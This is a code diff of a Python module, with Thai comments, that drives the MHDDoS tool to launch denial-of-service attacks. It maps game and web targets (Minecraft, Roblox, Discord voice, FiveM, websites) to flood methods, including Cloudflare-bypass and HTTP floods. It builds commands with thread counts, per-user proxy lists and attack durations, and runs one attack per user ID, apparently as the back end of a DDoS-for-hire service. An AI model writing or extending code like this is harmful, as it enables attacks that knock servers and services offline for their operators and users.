@@ -1,37 +1,28 @@
 # mhddos_engine.py
-"""
-MHDDoS engine — เรียก start.py เป็น subprocess
-L7: python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
-L4: python3 start.py <method> <ip:port> <threads> <duration>
-"""
 import asyncio
 import os
 import sys
-from config import MHDDOS_FULL, PROXIES_PER_DEVICE, PROXY_ATTACK_FILE
+from config import MHDDOS_FULL, PROXIES_PER_DEVICE, proxy_attack_file
 
 
-# ── C4: method names ตาม MHDDoS MatrixTM standard ──
-# ถ้า start.py ของ dj ไม่มี method ไหน → attack exit code 1 ทันที
-# verify: `python3 start.py --help` หรือเปิด start.py ดู class Layer4 / Layer7
 MODULE_MAP = {
-    "minecraft":  ("L4", "MCBOT",     {}),      # MCBOT = Minecraft bot flood
-    "roblox":     ("L4", "UDP",       {}),      # Roblox ใช้ UDP
-    "discord":    ("L4", "UDP",       {}),      # voice channel = UDP
-    "fivem":      ("L4", "FIVEM",     {}),      # FIVEM (มีใน MHDDoS v2.4+)
-    "web":        ("L7", "CFB",       {"rpc": 64}),
-    "web_bypass": ("L7", "BYPASS",    {"rpc": 64}),
-    "web_stress": ("L7", "STRESS",    {"rpc": 64}),
-    "http_flood": ("L7", "GET",       {"rpc": 128}),
+    "minecraft":  ("L4", "MCBOT",  {}),
+    "roblox":     ("L4", "UDP",    {}),
+    "discord":    ("L4", "UDP",    {}),
+    "fivem":      ("L4", "FIVEM",  {}),
+    "web":        ("L7", "CFB",    {"rpc": 64}),
+    "web_bypass": ("L7", "BYPASS", {"rpc": 64}),
+    "web_stress": ("L7", "STRESS", {"rpc": 64}),
+    "http_flood": ("L7", "GET",    {"rpc": 128}),
 }
 
 
 class MHDDoSEngine:
-    def __init__(self, proxies_path: str = PROXY_ATTACK_FILE):
-        self.proxies_path = proxies_path
+    def __init__(self):
         self.running: dict[int, asyncio.subprocess.Process] = {}
 
     def _build_cmd(self, module: str, target: str, port: int,
-                   duration: int, devices: int):
+                   duration: int, devices: int, proxies_path: str):
         info = MODULE_MAP.get(module)
         if not info:
             raise ValueError(f"unknown module: {module}")
@@ -45,9 +36,9 @@ class MHDDoSEngine:
             if port and ":" not in host.split("//")[-1]:
                 host = f"{host}:{port}"
             return [
-                sys.executable, MHDDOS_FULL,          # H1: absolute path
+                sys.executable, MHDDOS_FULL,
                 method, host, "5", str(threads),
-                self.proxies_path, str(rpc), str(duration),
+                proxies_path, str(rpc), str(duration),
             ]
         else:
             host = target.split("//")[-1].split("/")[0]
@@ -63,14 +54,15 @@ class MHDDoSEngine:
         if user_id in self.running:
             raise RuntimeError("มี attack รันอยู่แล้ว")
 
-        cmd = self._build_cmd(module, target, port, duration, devices)
+        proxies_path = proxy_attack_file(user_id)
+        cmd = self._build_cmd(module, target, port, duration,
+                              devices, proxies_path)
 
-        # C2: ทิ้ง output — ป้องกัน pipe buffer block
         proc = await asyncio.create_subprocess_exec(
             *cmd,
             stdout=asyncio.subprocess.DEVNULL,
             stderr=asyncio.subprocess.DEVNULL,
-            cwd=os.path.dirname(MHDDOS_FULL),   # ให้ MHDDoS หา relative files ได้
+            cwd=os.path.dirname(MHDDOS_FULL),
         )
         self.running[user_id] = proc
         return proc
